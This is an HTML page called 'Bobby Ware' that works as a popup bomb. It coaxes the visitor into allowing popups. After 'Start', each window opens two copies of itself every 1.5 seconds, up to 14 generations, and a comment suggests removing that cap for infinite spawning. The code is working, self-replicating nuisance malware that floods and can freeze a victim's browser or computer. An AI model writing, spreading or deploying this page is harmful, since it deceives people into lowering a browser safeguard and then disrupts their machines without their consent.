<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bobby Ware</title>
<style>
  html, body {
    margin: 0;
    height: 100%;
    background: #0b1530;
    color: #fff;
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    overflow: hidden;
  }
  #ui {
    max-width: 420px;
    padding: 24px;
  }
  h1 {
    font-weight: 600;
    margin-bottom: 8px;
  }
  p {
    color: #b9c2dd;
    font-size: 14px;
    line-height: 1.4;
  }
  button {
    background: #3b6cf0;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 12px 22px;
    font-size: 15px;
    margin: 8px 6px 0;
    cursor: pointer;
  }
  button:disabled {
    background: #33406b;
    cursor: not-allowed;
  }
  button:hover:not(:disabled) {
    background: #2f5adf;
  }
  #spawnImg {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    object-fit: cover;
  }
  #closeBtn {
    position: fixed;
    top: 10px;
    right: 10px;
    background: #ff4d4f;
    display: none;
    z-index: 10;
  }
</style>
</head>
<body>

<div id="ui">
  <h1>Bobby Ware</h1>
  <p id="status">
    Step 1: click "Enable Popups" (this lets the browser grant permission
    for this page to open new windows).<br><br>
    Step 2: click "Start" to begin.
  </p>
  <button id="enableBtn">Enable Popups</button>
  <button id="startBtn" disabled>Start</button>
</div>

<img id="spawnImg" src="spawn.jpg" alt="">
<button id="closeBtn">Close this window</button>

<script>
  const params    = new URLSearchParams(location.search);
  const gen       = parseInt(params.get('gen') || '0', 10);
  const CHILDREN  = 2;      // how many popups each window spawns
  const SPAWN_MS  = 1500;   // how long the image shows before spawning more (kept short = rapid duplication)
  const MAX_GEN   = 14;     // safety cap so it can't literally lock up your PC forever; raise/remove for truly infinite

  const ui        = document.getElementById('ui');
  const img       = document.getElementById('spawnImg');
  const closeBtn  = document.getElementById('closeBtn');

  document.title = gen === 0 ? 'Bobby Ware' : 'Bobby Ware #' + gen;

  function spawnChildren() {
    if (gen >= MAX_GEN) return;
    const nextGen = gen + 1;
    for (let i = 0; i < CHILDREN; i++) {
      window.open(
        `index.html?gen=${nextGen}`,
        '_blank',
        'width=480,height=360,left=' + Math.floor(Math.random() * 400) +
        ',top=' + Math.floor(Math.random() * 300)
      );
    }
  }

  function showImageThenSpawn() {
    // Instant — no delay, no loading screen, image shows immediately.
    ui.style.display       = 'none';
    img.style.display      = 'block';
    closeBtn.style.display = 'block';
    setTimeout(spawnChildren, SPAWN_MS);
  }

  closeBtn.onclick = () => window.close();

  if (gen === 0) {
    // Root window: require the user to grant popup permission, then Start.
    document.getElementById('enableBtn').onclick = () => {
      let test1, test2;
      try {
        test1 = window.open('about:blank', '_blank', 'width=100,height=100');
        test2 = window.open('about:blank', '_blank', 'width=100,height=100,left=150');
      } catch (e) {
        test1 = null;
        test2 = null;
      }
      setTimeout(() => {
        const blocked1 = !test1 || test1.closed || typeof test1.closed === 'undefined';
        const blocked2 = !test2 || test2.closed || typeof test2.closed === 'undefined';
        if (!blocked1 && !blocked2) {
          test1.close();
          test2.close();
          document.getElementById('status').textContent =
            'Popups are enabled. Press Start to begin.';
          document.getElementById('startBtn').disabled = false;
        } else {
          if (!blocked1) test1.close();
          if (!blocked2) test2.close();
          document.getElementById('status').textContent =
            'Your browser blocked the popup. Look for a blocked-popup icon in the ' +
            'address bar, choose "Always allow popups from this site," then click ' +
            '"Enable Popups" again.';
        }
      }, 300);
    };
    document.getElementById('startBtn').onclick = showImageThenSpawn;
  } else {
    // Child windows: instant, no UI, no delay before the image appears.
    showImageThenSpawn();
  }
</script>

</body>
</html>
